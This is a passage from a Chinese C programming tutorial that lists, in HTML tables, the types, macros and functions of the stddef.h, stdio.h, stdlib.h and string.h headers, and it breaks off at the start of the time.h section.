<h2 id="库宏-9"><a href="#库宏-9" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 stddef.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-null.html">NULL</a> 这个宏是一个空指针常量的值。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-offsetof.html">offsetof(type, member-designator)</a> 这会生成一个类型为 size_t 的整型常量，它是一个结构成员相对于结构开头的字节偏移量。成员是由 <em>member-designator</em> 给定的，结构的名称是在 <em>type</em> 中给定的。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-stdio-h-gt"><a href="#C-标准库-lt-stdio-h-gt" class="headerlink" title="C 标准库 - &lt;stdio.h&gt;"></a>C 标准库 - &lt;stdio.h&gt;</h1><h2 id="简介-11"><a href="#简介-11" class="headerlink" title="简介"></a>简介</h2><p><strong>stdio .h</strong> 头文件定义了三个变量类型、一些宏和各种函数来执行输入和输出。</p>
<h2 id="库变量-4"><a href="#库变量-4" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 stdio.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>size_t</strong>  这是无符号整数类型，它是 <strong>sizeof</strong> 关键字的结果。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>FILE</strong>  这是一个适合存储文件流信息的对象类型。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>fpos_t</strong>  这是一个适合存储文件中任何位置的对象类型。</td>
</tr>
</tbody></table>
<h2 id="库宏-10"><a href="#库宏-10" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 stdio.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>NULL</strong> 这个宏是一个空指针常量的值。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>_IOFBF、_IOLBF</strong> 和 <strong>_IONBF</strong>  这些宏扩展了带有特定值的整型常量表达式，并适用于 <strong>setvbuf</strong> 函数的第三个参数。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>BUFSIZ</strong> 这个宏是一个整数，该整数代表了 <strong>setbuf</strong> 函数使用的缓冲区大小。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>EOF</strong>  这个宏是一个表示已经到达文件结束的负整数。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>FOPEN_MAX</strong>  这个宏是一个整数，该整数代表了系统可以同时打开的文件数量。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>FILENAME_MAX</strong>  这个宏是一个整数，该整数代表了字符数组可以存储的文件名的最大长度。如果实现没有任何限制，则该值应为推荐的最大值。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><strong>L_tmpnam</strong>  这个宏是一个整数，该整数代表了字符数组可以存储的由 tmpnam 函数创建的临时文件名的最大长度。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><strong>SEEK_CUR、SEEK_END</strong> 和 <strong>SEEK_SET</strong>  这些宏是在 <strong>fseek</strong> 函数中使用，用于在一个文件中定位不同的位置。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><strong>TMP_MAX</strong>  这个宏是 tmpnam 函数可生成的独特文件名的最大数量。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><strong>stderr、stdin</strong> 和 <strong>stdout</strong>  这些宏是指向 FILE 类型的指针，分别对应于标准错误、标准输入和标准输出流。</td>
</tr>
</tbody></table>
<h2 id="库函数-5"><a href="#库函数-5" class="headerlink" title="库函数"></a>库函数</h2><p>下面是头文件 stdio.h 中定义的函数：</p>
<blockquote>
<p>为了更好地理解函数，请按照下面的序列学习这些函数，因为第一个函数中创建的文件会在后续的函数中使用到。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fclose.html">int fclose(FILE *stream)</a> 关闭流 stream。刷新所有的缓冲区。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-clearerr.html">void clearerr(FILE *stream)</a> 清除给定流 stream 的文件结束和错误标识符。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-feof.html">int feof(FILE *stream)</a> 测试给定流 stream 的文件结束标识符。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ferror.html">int ferror(FILE *stream)</a> 测试给定流 stream 的错误标识符。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fflush.html">int fflush(FILE *stream)</a> 刷新流 stream 的输出缓冲区。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fgetpos.html">int fgetpos(FILE *stream, fpos_t *pos)</a> 获取流 stream 的当前文件位置，并把它写入到 pos。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fopen.html">FILE *fopen(const char *filename, const char *mode)</a> 使用给定的模式 mode 打开 filename 所指向的文件。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fread.html">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</a> 从给定流 stream 读取数据到 ptr 所指向的数组中。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-freopen.html">FILE *freopen(const char *filename, const char *mode, FILE *stream)</a> 把一个新的文件名 filename 与给定的打开的流 stream 关联，同时关闭流中的旧文件。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fseek.html">int fseek(FILE *stream, long int offset, int whence)</a> 设置流 stream 的文件位置为给定的偏移 offset，参数 <em>offset</em> 意味着从给定的 <em>whence</em> 位置查找的字节数。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fsetpos.html">int fsetpos(FILE *stream, const fpos_t *pos)</a> 设置给定流 stream 的文件位置为给定的位置。参数 <em>pos</em> 是由函数 fgetpos 给定的位置。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ftell.html">long int ftell(FILE *stream)</a> 返回给定流 stream 的当前文件位置。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fwrite.html">size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)</a> 把 ptr 所指向的数组中的数据写入到给定流 stream 中。</td>
</tr>
<tr>
<td align="left">14</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-remove.html">int remove(const char *filename)</a> 删除给定的文件名 filename，以便它不再被访问。</td>
</tr>
<tr>
<td align="left">15</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-rename.html">int rename(const char *old_filename, const char *new_filename)</a> 把 old_filename 所指向的文件名改为 new_filename。</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-rewind.html">void rewind(FILE *stream)</a> 设置文件位置为给定流 stream 的文件的开头。</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-setbuf.html">void setbuf(FILE *stream, char *buffer)</a> 定义流 stream 应如何缓冲。</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-setvbuf.html">int setvbuf(FILE *stream, char *buffer, int mode, size_t size)</a> 另一个定义流 stream 应如何缓冲的函数。</td>
</tr>
<tr>
<td align="left">19</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-tmpfile.html">FILE *tmpfile(void)</a> 以二进制更新模式(wb+)创建临时文件。</td>
</tr>
<tr>
<td align="left">20</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-tmpnam.html">char *tmpnam(char *str)</a> 生成并返回一个有效的临时文件名，该文件名之前是不存在的。</td>
</tr>
<tr>
<td align="left">21</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fprintf.html">int fprintf(FILE *stream, const char *format, …)</a> 发送格式化输出到流 stream 中。</td>
</tr>
<tr>
<td align="left">22</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-printf.html">int printf(const char *format, …)</a> 发送格式化输出到标准输出 stdout。</td>
</tr>
<tr>
<td align="left">23</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-sprintf.html">int sprintf(char *str, const char *format, …)</a> 发送格式化输出到字符串。</td>
</tr>
<tr>
<td align="left">24</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-vfprintf.html">int vfprintf(FILE *stream, const char *format, va_list arg)</a> 使用参数列表发送格式化输出到流 stream 中。</td>
</tr>
<tr>
<td align="left">25</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-vprintf.html">int vprintf(const char *format, va_list arg)</a> 使用参数列表发送格式化输出到标准输出 stdout。</td>
</tr>
<tr>
<td align="left">26</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-vsprintf.html">int vsprintf(char *str, const char *format, va_list arg)</a> 使用参数列表发送格式化输出到字符串。</td>
</tr>
<tr>
<td align="left">27</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fscanf.html">int fscanf(FILE *stream, const char *format, …)</a> 从流 stream 读取格式化输入。</td>
</tr>
<tr>
<td align="left">28</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-scanf.html">int scanf(const char *format, …)</a> 从标准输入 stdin 读取格式化输入。</td>
</tr>
<tr>
<td align="left">29</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-sscanf.html">int sscanf(const char *str, const char *format, …)</a> 从字符串读取格式化输入。</td>
</tr>
<tr>
<td align="left">30</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fgetc.html">int fgetc(FILE *stream)</a> 从指定的流 stream 获取下一个字符（一个无符号字符），并把位置标识符往前移动。</td>
</tr>
<tr>
<td align="left">31</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fgets.html">char *fgets(char *str, int n, FILE *stream)</a> 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 <strong>(n-1)</strong> 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</td>
</tr>
<tr>
<td align="left">32</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fputc.html">int fputc(int char, FILE *stream)</a> 把参数 char 指定的字符（一个无符号字符）写入到指定的流 stream 中，并把位置标识符往前移动。</td>
</tr>
<tr>
<td align="left">33</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-fputs.html">int fputs(const char *str, FILE *stream)</a> 把字符串写入到指定的流 stream 中，但不包括空字符。</td>
</tr>
<tr>
<td align="left">34</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-getc.html">int getc(FILE *stream)</a> 从指定的流 stream 获取下一个字符（一个无符号字符），并把位置标识符往前移动。</td>
</tr>
<tr>
<td align="left">35</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-getchar.html">int getchar(void)</a> 从标准输入 stdin 获取一个字符（一个无符号字符）。</td>
</tr>
<tr>
<td align="left">36</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-gets.html">char *gets(char *str)</a> 从标准输入 stdin 读取一行，并把它存储在 str 所指向的字符串中。当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</td>
</tr>
<tr>
<td align="left">37</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-putc.html">int putc(int char, FILE *stream)</a> 把参数 char 指定的字符（一个无符号字符）写入到指定的流 stream 中，并把位置标识符往前移动。</td>
</tr>
<tr>
<td align="left">38</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-putchar.html">int putchar(int char)</a> 把参数 char 指定的字符（一个无符号字符）写入到标准输出 stdout 中。</td>
</tr>
<tr>
<td align="left">39</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-puts.html">int puts(const char *str)</a> 把一个字符串写入到标准输出 stdout，直到空字符，但不包括空字符。换行符会被追加到输出中。</td>
</tr>
<tr>
<td align="left">40</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ungetc.html">int ungetc(int char, FILE *stream)</a> 把字符 char（一个无符号字符）推入到指定的流 stream 中，以便它是下一个被读取到的字符。</td>
</tr>
<tr>
<td align="left">41</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-perror.html">void perror(const char *str)</a> 把一个描述性错误消息输出到标准错误 stderr。首先输出字符串 str，后跟一个冒号，然后是一个空格。</td>
</tr>
<tr>
<td align="left">42</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-snprintf.html">int snprintf(char *str, size_t size, const char *format, …)</a> 格式字符串到 str 中。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-stdlib-h-gt"><a href="#C-标准库-lt-stdlib-h-gt" class="headerlink" title="C 标准库 - &lt;stdlib.h&gt;"></a>C 标准库 - &lt;stdlib.h&gt;</h1><h2 id="简介-12"><a href="#简介-12" class="headerlink" title="简介"></a>简介</h2><p><strong>stdlib .h</strong> 头文件定义了四个变量类型、一些宏和各种通用工具函数。</p>
<h2 id="库变量-5"><a href="#库变量-5" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 stdlib.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>size_t</strong>  这是无符号整数类型，它是 <strong>sizeof</strong> 关键字的结果。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>wchar_t</strong>  这是一个宽字符常量大小的整数类型。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>div_t</strong>  这是 <strong>div</strong> 函数返回的结构。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>ldiv_t</strong>  这是 <strong>ldiv</strong> 函数返回的结构。</td>
</tr>
</tbody></table>
<h2 id="库宏-11"><a href="#库宏-11" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 stdlib.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>NULL</strong> 这个宏是一个空指针常量的值。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>EXIT_FAILURE</strong> 这是 exit 函数失败时要返回的值。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>EXIT_SUCCESS</strong> 这是 exit 函数成功时要返回的值。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>RAND_MAX</strong>  这个宏是 rand 函数返回的最大值。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>MB_CUR_MAX</strong>  这个宏表示在多字节字符集中的最大字符数，不能大于 MB_LEN_MAX。</td>
</tr>
</tbody></table>
<h2 id="库函数-6"><a href="#库函数-6" class="headerlink" title="库函数"></a>库函数</h2><p>下面是头文件 stdlib.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-atof.html">double atof(const char *str)</a> 把参数 <em>str</em> 所指向的字符串转换为一个浮点数（类型为 double 型）。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-atoi.html">int atoi(const char *str)</a> 把参数 <em>str</em> 所指向的字符串转换为一个整数（类型为 int 型）。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-atol.html">long int atol(const char *str)</a> 把参数 <em>str</em> 所指向的字符串转换为一个长整数（类型为 long int 型）。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strtod.html">double strtod(const char *str, char **endptr)</a> 把参数 <em>str</em> 所指向的字符串转换为一个浮点数（类型为 double 型）。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strtol.html">long int strtol(const char *str, char **endptr, int base)</a> 把参数 <em>str</em> 所指向的字符串转换为一个长整数（类型为 long int 型）。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strtoul.html">unsigned long int strtoul(const char *str, char **endptr, int base)</a> 把参数 <em>str</em> 所指向的字符串转换为一个无符号长整数（类型为 unsigned long int 型）。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-calloc.html">void *calloc(size_t nitems, size_t size)</a> 分配所需的内存空间，并返回一个指向它的指针。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-free.html">void free(void *ptr)</a> 释放之前调用 <em>calloc、malloc</em> 或 <em>realloc</em> 所分配的内存空间。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-malloc.html">void *malloc(size_t size)</a> 分配所需的内存空间，并返回一个指向它的指针。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-realloc.html">void *realloc(void *ptr, size_t size)</a> 尝试重新调整之前调用 <em>malloc</em> 或 <em>calloc</em> 所分配的 ptr 所指向的内存块的大小。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-abort.html">void abort(void)</a> 使一个异常程序终止。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-atexit.html">int atexit(void (*func)(void))</a> 当程序正常终止时，调用指定的函数 <strong>func</strong>。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-exit.html">void exit(int status)</a> 使程序正常终止。</td>
</tr>
<tr>
<td align="left">14</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-getenv.html">char *getenv(const char *name)</a> 搜索 name 所指向的环境字符串，并返回相关的值给字符串。</td>
</tr>
<tr>
<td align="left">15</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-system.html">int system(const char *string)</a> 由 string 指定的命令传给要被命令处理器执行的主机环境。</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-bsearch.html">void *bsearch(const void *key, const void *base, size_t nitems, size_t size, int (*compar)(const void *, const void *))</a> 执行二分查找。</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-qsort.html">void qsort(void *base, size_t nitems, size_t size, int (*compar)(const void <em>, const void</em>))</a> 数组排序。</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-abs.html">int abs(int x)</a> 返回 x 的绝对值。</td>
</tr>
<tr>
<td align="left">19</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-div.html">div_t div(int numer, int denom)</a> 分子除以分母。</td>
</tr>
<tr>
<td align="left">20</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-labs.html">long int labs(long int x)</a> 返回 x 的绝对值。</td>
</tr>
<tr>
<td align="left">21</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ldiv.html">ldiv_t ldiv(long int numer, long int denom)</a> 分子除以分母。</td>
</tr>
<tr>
<td align="left">22</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-rand.html">int rand(void)</a> 返回一个范围在 0 到 <em>RAND_MAX</em> 之间的伪随机数。</td>
</tr>
<tr>
<td align="left">23</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-srand.html">void srand(unsigned int seed)</a> 该函数播种由函数 <strong>rand</strong> 使用的随机数发生器。</td>
</tr>
<tr>
<td align="left">24</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-mblen.html">int mblen(const char *str, size_t n)</a> 返回参数 <em>str</em> 所指向的多字节字符的长度。</td>
</tr>
<tr>
<td align="left">25</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-mbstowcs.html">size_t mbstowcs(schar_t *pwcs, const char *str, size_t n)</a> 把参数 <em>str</em> 所指向的多字节字符的字符串转换为参数 <em>pwcs</em> 所指向的数组。</td>
</tr>
<tr>
<td align="left">26</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-mbtowc.html">int mbtowc(whcar_t *pwc, const char *str, size_t n)</a> 检查参数 <em>str</em> 所指向的多字节字符。</td>
</tr>
<tr>
<td align="left">27</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-wcstombs.html">size_t wcstombs(char *str, const wchar_t *pwcs, size_t n)</a> 把数组 <em>pwcs</em> 中存储的编码转换为多字节字符，并把它们存储在字符串 <em>str</em> 中。</td>
</tr>
<tr>
<td align="left">28</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-wctomb.html">int wctomb(char *str, wchar_t wchar)</a> 检查对应于参数 <em>wchar</em> 所给出的多字节字符的编码。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-string-h-gt"><a href="#C-标准库-lt-string-h-gt" class="headerlink" title="C 标准库 - &lt;string.h&gt;"></a>C 标准库 - &lt;string.h&gt;</h1><h2 id="简介-13"><a href="#简介-13" class="headerlink" title="简介"></a>简介</h2><p><strong>string .h</strong> 头文件定义了一个变量类型、一个宏和各种操作字符数组的函数。</p>
<h2 id="库变量-6"><a href="#库变量-6" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 string.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>size_t</strong>  这是无符号整数类型，它是 <strong>sizeof</strong> 关键字的结果。</td>
</tr>
</tbody></table>
<h2 id="库宏-12"><a href="#库宏-12" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 string.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>NULL</strong> 这个宏是一个空指针常量的值。</td>
</tr>
</tbody></table>
<h2 id="库函数-7"><a href="#库函数-7" class="headerlink" title="库函数"></a>库函数</h2><p>下面是头文件 string.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-memchr.html">void *memchr(const void *str, int c, size_t n)</a> 在参数 <em>str</em> 所指向的字符串的前 n 个字节中搜索第一次出现字符 c（一个无符号字符）的位置。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-memcmp.html">int memcmp(const void *str1, const void *str2, size_t n)</a> 把 <em>str1</em> 和 <em>str2</em> 的前 n 个字节进行比较。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-memcpy.html">void *memcpy(void *dest, const void *src, size_t n)</a> 从 src 复制 n 个字符到 <em>dest</em>。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-memmove.html">void *memmove(void *dest, const void *src, size_t n)</a> 另一个用于从 <em>src</em> 复制 n 个字符到 <em>dest</em> 的函数。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-memset.html">void *memset(void *str, int c, size_t n)</a> 复制字符 c（一个无符号字符）到参数 <em>str</em> 所指向的字符串的前 n 个字符。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strcat.html">char *strcat(char *dest, const char *src)</a> 把 <em>src</em> 所指向的字符串追加到 <em>dest</em> 所指向的字符串的结尾。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strncat.html">char *strncat(char *dest, const char *src, size_t n)</a> 把 <em>src</em> 所指向的字符串追加到 <em>dest</em> 所指向的字符串的结尾，直到 n 字符长度为止。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strchr.html">char *strchr(const char *str, int c)</a> 在参数 <em>str</em> 所指向的字符串中搜索第一次出现字符 c（一个无符号字符）的位置。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strcmp.html">int strcmp(const char *str1, const char *str2)</a> 把 <em>str1</em> 所指向的字符串和 <em>str2</em> 所指向的字符串进行比较。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strncmp.html">int strncmp(const char *str1, const char *str2, size_t n)</a> 把 <em>str1</em> 和 <em>str2</em> 进行比较，最多比较前 n 个字节。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strcoll.html">int strcoll(const char *str1, const char *str2)</a> 把 <em>str1</em> 和 <em>str2</em> 进行比较，结果取决于 LC_COLLATE 的位置设置。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strcpy.html">char *strcpy(char *dest, const char *src)</a> 把 <em>src</em> 所指向的字符串复制到 <em>dest</em>。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strncpy.html">char *strncpy(char *dest, const char *src, size_t n)</a> 把 <em>src</em> 所指向的字符串复制到 <em>dest</em>，最多复制 n 个字符。</td>
</tr>
<tr>
<td align="left">14</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strcspn.html">size_t strcspn(const char *str1, const char *str2)</a> 检索字符串 str1 开头连续有几个字符都不含字符串 str2 中的字符。</td>
</tr>
<tr>
<td align="left">15</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strerror.html">char *strerror(int errnum)</a> 从内部数组中搜索错误号 errnum，并返回一个指向错误消息字符串的指针。</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strlen.html">size_t strlen(const char *str)</a> 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strpbrk.html">char *strpbrk(const char *str1, const char *str2)</a> 检索字符串 <em>str1</em> 中第一个匹配字符串 <em>str2</em> 中字符的字符，不包含空结束字符。也就是说，依次检验字符串 str1 中的字符，当被检验字符在字符串 str2 中也包含时，则停止检验，并返回该字符位置。</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strrchr.html">char *strrchr(const char *str, int c)</a> 在参数 <em>str</em> 所指向的字符串中搜索最后一次出现字符 c（一个无符号字符）的位置。</td>
</tr>
<tr>
<td align="left">19</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strspn.html">size_t strspn(const char *str1, const char *str2)</a> 检索字符串 <em>str1</em> 中第一个不在字符串 <em>str2</em> 中出现的字符下标。</td>
</tr>
<tr>
<td align="left">20</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strstr.html">char *strstr(const char *haystack, const char *needle)</a> 在字符串 <em>haystack</em> 中查找第一次出现字符串 <em>needle</em>（不包含空结束字符）的位置。</td>
</tr>
<tr>
<td align="left">21</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strtok.html">char *strtok(char *str, const char *delim)</a> 分解字符串 <em>str</em> 为一组字符串，<em>delim</em> 为分隔符。</td>
</tr>
<tr>
<td align="left">22</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strxfrm.html">size_t strxfrm(char *dest, const char *src, size_t n)</a> 根据程序当前的区域选项中的 LC_COLLATE 来转换字符串 <strong>src</strong> 的前 <strong>n</strong> 个字符，并把它们放置在字符串 <strong>dest</strong> 中。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-time-h-gt"><a href="#C-标准库-lt-time-h-gt" class="headerlink" title="C 标准库 - &lt;time.h&gt;"></a>C 标准库 - &lt;time.h&gt;</h1><h2 id="简介-14"><a href="#简介-14" class="headerlink" title="简介"></a>简介</h2><p><strong>time.h</strong> 头文件定义了四个变量类型、两个宏和各种操作日期和时间的函数。</p>
<h2 id="库变量-7"><a href="#库变量-7" class="headerlink" title="库变量"></a>库变量</h2><p>下面是头文件 time.h 中定义的变量类型：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">变量 &amp; 描述</th>
